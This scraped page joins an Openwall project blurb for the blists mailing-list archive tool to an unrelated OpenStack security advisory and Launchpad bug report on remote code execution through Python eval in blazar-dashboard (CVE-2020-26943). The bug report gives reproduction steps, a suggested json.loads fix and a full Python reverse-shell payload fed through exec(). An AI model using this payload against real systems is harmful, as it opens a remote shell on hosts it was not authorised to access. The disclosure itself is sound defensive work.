# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

# OSSA-2020-007: Remote code execution in blazar-dashboard[Â¶](#ossa-2020-007-remote-code-execution-in-blazar-dashboard "Link to this heading")

Date:

October 12, 2020

CVE:

CVE-2020-26943

## Affects[Â¶](#affects "Link to this heading")

* Blazar-dashboard: <1.3.1, ==2.0.0, ==3.0.0

## Description[Â¶](#description "Link to this heading")

Lukas Euler (Positive Security) reported a vulnerability in blazar-dashboard. A user allowed to access the Blazar dashboard in Horizon may trigger code execution on the Horizon host as the user the Horizon service runs under. This may result in Horizon host unauthorized access and further compromise of the Horizon service. All setups using the Horizon dashboard with the blazar-dashboard plugin are affected.

# Authenticated RCE in blazar-dashboard via python expression in POST parameters

Bug #1895688 reported by
[Lukas](https://launchpad.net/~lukas-eu)
on 2020-09-15

[262](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Blazar](https://bugs.launchpad.net/blazar) | Fix Released | Critical | [Pierre Riteau](https://launchpad.net/~priteau) |  |

### Bug Description

#Description

Several endpoints in blazar-dashboard use the python `eval` function to parse raw user input which is expected to be in JSON format. This can be exploited by an authenticated user to gain arbitrary code execution on the Horizon host.

#Reproduction

- Log into Horizon (blazar\_dashboard must be installed and enabled)

- Navigate to `Admin` -> `Reservation` -> `Hosts`

- Click `+ Create Hosts`

- Enter a python expression in the text area under `Extra Capabilities`

-- It is also possible to execute python code containing multiple statements by wrapping it into an `exec('<python code>')` call

-- The attached video shows how a reverse shell can be achieved using this payload: `exec('import pty;import socket,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")')`

- Click `Create Hosts`

#Suggested fix

1.) Use `json.loads` instead of `eval` to parse JSON data

Only the `extra\_caps` parameter could be tested due to problems with the local testing setup. However, the attached patch replaces all 4 usages of `eval` within the blazar\_dashboard project, as they seem likely to contain additional vulnerabilities.

Please note that this change will break some hopefully unused functionality, like:

- arithmetic expressions in property values

```

{

    "key": 1300 + 37

}

```

- pseudo JSON using single quotes instead of double quotes

```

{

    'key': 1337

}

```

I agree this sounds like a problem. I'm not especially familiar with use of Blazar, but it sounds like these JSON payloads are expected to come from sources other than the operator of the Horizon host, in which case this definitely represents at least privilege escalation.

Pierre: in your opinion would it be possible to include the included patch or something like it in a Victoria release candidate (as in by early next week)? If not, we're probably better off delaying any advisory until after release week and then backporting it in a stable point release just after.

Also I do strongly recommend adding bandit to the linters for your projects, as it explicitly identifies use of eval/exec in your source code (among other common risks).

@Jeremy: Out of the four uses of eval, one is parsing data coming from Nova and two others are input from an Horizon admin. Unfortunately, the last one is parsing user input in the Update Lease form using the field titled "Reservation values to update".

Affects
~~~~~~~
- Blazar-dashboard: <1.3.1, ==2.0.0, ==3.0.0

Description
~~~~~~~~~~~
Lukas Euler (Positive Security) reported a vulnerability in
blazar-dashboard. A user allowed to access the Blazar dashboard in
Horizon may trigger code execution on the Horizon host as the user the
Horizon service runs under. This may result in Horizon host
unauthorized access and further compromise of the Horizon service. All
setups using the Horizon dashboard with the blazar-dashboard plugin
are affected.
